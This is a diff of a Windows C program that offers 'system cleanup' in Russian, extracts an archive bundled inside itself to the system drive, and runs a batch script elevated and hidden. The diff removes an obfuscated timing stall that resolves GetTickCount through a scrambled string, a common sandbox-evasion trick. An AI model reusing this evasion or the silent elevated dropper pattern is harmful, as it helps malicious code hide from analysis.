@@ -3,10 +3,8 @@
 #include <string.h>
 #include <stdint.h>
 #include <fcntl.h>
-#include <time.h>
 #include <windows.h>
 
-typedef DWORD (WINAPI *TFN)(VOID);
 typedef DWORD (WINAPI *MSGA)(HWND,LPCSTR,LPCSTR,UINT);
 typedef HINSTANCE (WINAPI *SEA)(HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
 
@@ -209,44 +207,14 @@ close_fp:
   fclose(f);
 }
 
-void pi(uint32_t t){
-  double p=0.0;
-  double s=1.0;
-  for(uint32_t i=0; i<t; i++){
-    double k=8.0*i;
-    p+=(4.0/(k+1)-2.0/(k+4)-1.0/(k+5)-1.0/(k+6))/s;
-    s*=16.0;
-  };
-}
-
-#define rot(c) (uint8_t)(((c<<4)&0xf0)|((c>>4)&0x0f))
-
-void wait_pi(){
-  uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
-  uint32_t i=0;
-  char fn[13],fs[]={0x74,0x56,0x47,0x45,0x96,0x36,0xb6,0x34,0xf6,0x57,0xe6,0x47,0x00}; //"GetTickCount"
-  for(i=0;i<13;i++) fn[i]=rot(fs[i]);
-  i=0;
-  TFN tfn=(TFN)GetProcAddress(GetModuleHandle("Kernel32.dll"),fn);
-  srand(tfn());
-  uint32_t t=rand()%10+10,start,stop;
-  start=tfn();
-  stop=start;
-  while((stop-start)/1000<t){
-    pi(offsets[i]);
-    i=(i+1)%7;
-    stop=tfn();
-  };
-}
-
 int main(int argc,char *argv[]){
   char path[257];
   MSGA msga=(MSGA)GetProcAddress(LoadLibrary("User32.dll"),"MessageBoxA");
   if(msga(NULL,"Произвести базовую очистку системы?","Внимание!",0x00001034)==6){
-    wait_pi();
     sprintf(path,"%s/",getenv("SYSTEMDRIVE"));
     unarc(path,argv[0]);
     SEA sea=(SEA)GetProcAddress(LoadLibrary("Shell32.dll"),"ShellExecuteA");
     sea(NULL,"runas","cmd.exe","/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",NULL,0);
   };
+  return 0;
 }
